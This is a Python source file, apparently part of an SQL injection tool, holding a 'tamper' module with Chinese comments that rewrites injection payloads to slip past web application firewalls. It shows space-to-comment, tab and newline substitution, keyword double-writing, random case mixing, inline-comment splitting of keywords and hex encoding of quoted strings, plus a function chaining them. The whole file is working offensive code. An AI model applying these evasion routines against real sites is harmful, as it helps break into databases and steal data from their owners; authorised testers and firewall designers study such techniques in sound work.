# -*- coding: utf-8 -*-
"""WAF 绕过 tamper 模块：空格替换、关键字双写、大小写混淆、内联注释"""

import random

TAMPERS = {}


def register(name):
    def deco(fn):
        TAMPERS[name] = fn
        return fn
    return deco


@register("space2comment")
def space2comment(s):
    """空格 -> /**/"""
    return s.replace(" ", "/**/")


@register("space2plus")
def space2plus(s):
    """空格 -> +（仅 GET 场景，+ 会被解码为空格）"""
    return s.replace(" ", "+")


@register("space2tab")
def space2tab(s):
    """空格 -> %09（水平制表符）"""
    return s.replace(" ", "%09")


@register("space2newline")
def space2newline(s):
    """空格 -> %0a（换行符）"""
    return s.replace(" ", "%0a")


@register("doublewrite")
def doublewrite(s):
    """关键字双写：针对过滤后删除一次关键字的 WAF（union->uniunionon）"""
    for kw in ("union", "select", "from", "where", "insert", "and", "or",
               "order", "group", "information_schema"):
        s = s.replace(kw, kw[0:len(kw) // 2] + kw + kw[len(kw) // 2:])
    return s


@register("casemix")
def casemix(s):
    """大小写混淆（MySQL 关键字不区分大小写）"""
    return "".join(c.upper() if random.random() < 0.5 else c.lower()
                   for c in s)


@register("inlinecomment")
def inlinecomment(s):
    """关键字中插入内联注释：sel/**/ect（部分 WAF 不解析注释内部）"""
    for kw in ("union", "select", "from", "where"):
        i = len(kw) // 2
        s = s.replace(kw, kw[:i] + "/**/" + kw[i:])
    return s


@register("hexencode")
def hexencode(s):
    """payload 中 'xxx' 字符串 -> 0x 十六进制（规避引号过滤）"""
    import re
    def repl(m):
        return "0x" + m.group(1).encode().hex()
    return re.sub(r"'([^']*)'", repl, s)


def apply(payload, names):
    """按顺序应用多个 tamper。names: 逗号分隔字符串或列表"""
    if isinstance(names, str):
        names = [n.strip() for n in names.split(",") if n.strip()]
    for n in names:
        fn = TAMPERS.get(n)
        if fn is None:
            from .utils import warn
            warn(f"未知 tamper: {n}（可用: {', '.join(TAMPERS)}）")
            continue
        payload = fn(payload)
    return payload


def available():
    return ", ".join(TAMPERS)
